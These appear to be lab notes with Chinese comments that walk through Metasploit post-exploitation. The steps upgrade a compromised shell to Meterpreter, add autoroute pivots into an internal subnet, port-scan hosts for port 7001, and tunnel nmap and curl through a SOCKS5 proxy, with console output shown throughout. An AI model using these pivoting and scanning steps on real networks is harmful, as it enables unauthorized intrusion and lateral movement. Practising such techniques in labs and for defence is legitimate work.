# upgrade cmdshell to meterpreter shell
# 也可以直接 sessions -u 1
search meterpreter type:post
use post/multi/manage/shell_to_meterpreter
show options
set lhost 192.168.56.214
set session 1

run -j

sessions -l
# Active sessions
# ===============
# 
#   Id  Name  Type                   Information          Connection
#   --  ----  ----                   -----------          ----------
#   1         shell cmd/unix                              192.168.56.214:4444 -> 192.168.56.216:60690  (192.168.56.216)
#   2         meterpreter x86/linux  root @ 192.170.84.5  192.168.56.214:4433 -> 192.168.56.216:39756  (192.168.56.216)

# 进入 meterpreter 会话 2
sessions -i 2

# setup pivot: run autoroute
# 查看网卡列表
ipconfig
# Interface  1
# ============
# Name         : lo
# Hardware MAC : 00:00:00:00:00:00
# MTU          : 65536
# Flags        : UP,LOOPBACK
# IPv4 Address : 127.0.0.1
# IPv4 Netmask : 255.0.0.0
# 
# 
# Interface 23
# ============
# Name         : eth0
# Hardware MAC : 02:42:c0:aa:54:05
# MTU          : 1500
# Flags        : UP,BROADCAST,MULTICAST
# IPv4 Address : 192.170.84.5
# IPv4 Netmask : 255.255.255.0
# 查看路由表
route
# IPv4 network routes
# ===================
# 
#     Subnet        Netmask        Gateway       Metric  Interface
#     ------        -------        -------       ------  ---------
#     0.0.0.0       0.0.0.0        192.170.84.1  0       eth0
#     192.170.84.0  255.255.255.0  0.0.0.0       0       eth0

# 查看 ARP 表
arp
# ARP cache
# =========
# 
#     IP address    MAC address        Interface
#     ----------    -----------        ---------
#     192.170.84.1  02:42:f9:ce:65:00

run autoroute -s 192.170.84.0/24

# 检查 Pivot 路由是否已创建成功
run autoroute -p
# Active Routing Table
# ====================
# 
#    Subnet             Netmask            Gateway
#    ------             -------            -------
#    192.170.84.0       255.255.255.0      Session 2

# portscan through pivot
search portscan
use auxiliary/scanner/portscan/tcp
show options
# 根据子网掩码推导
set RHOSTS 192.170.84.2-254
# 根据「经验」
set rport 7001
# 根据「经验」
set threads 10
# 开始扫描
run -j

# 等到扫描结果 100%
# 查看主机存活情况
hosts

# 查看发现的服务列表
services
# Services
# ========
# 
# host            port   proto  name           state   info
# ----            ----   -----  ----           -----   ----
# 192.168.56.216  29551  tcp    http           open    Jetty 9.4.31.v20200723
# 192.170.84.2    7001   tcp                   open
# 192.170.84.3    7001   tcp                   open
# 192.170.84.4    7001   tcp                   open
# 192.170.84.5    7001   tcp                   open

# setup socks5 proxy 
search socks_proxy
use auxiliary/server/socks_proxy
run -j
# 查看后台任务
jobs -l
# Jobs
# ====
# 
#   Id  Name                           Payload  Payload opts
#   --  ----                           -------  ------------
#   4   Auxiliary: server/socks_proxy

# 新开一个 ssh 会话窗口
# 检查 1080 端口服务开放情况
sudo lsof -i tcp:1080 -l -n -P
# COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
# ruby    299727     1000   10u  IPv4 910459      0t0  TCP *:1080 (LISTEN)

# 编辑 /etc/proxychains4.conf
sudo sed -i.bak -r "s/socks4\s+127.0.0.1\s+9050/socks5 127.0.0.1 1080/g" /etc/proxychains4.conf

proxychains sudo nmap -vv -n -p 7001 -Pn -sT 192.170.84.2-5

# 回到 metasploit 会话窗口
# 重新进入 shell 会话
sessions -i 1
curl http://192.170.84.2:7001 -vv
curl http://192.170.84.3:7001 -vv
curl http://192.170.84.4:7001 -vv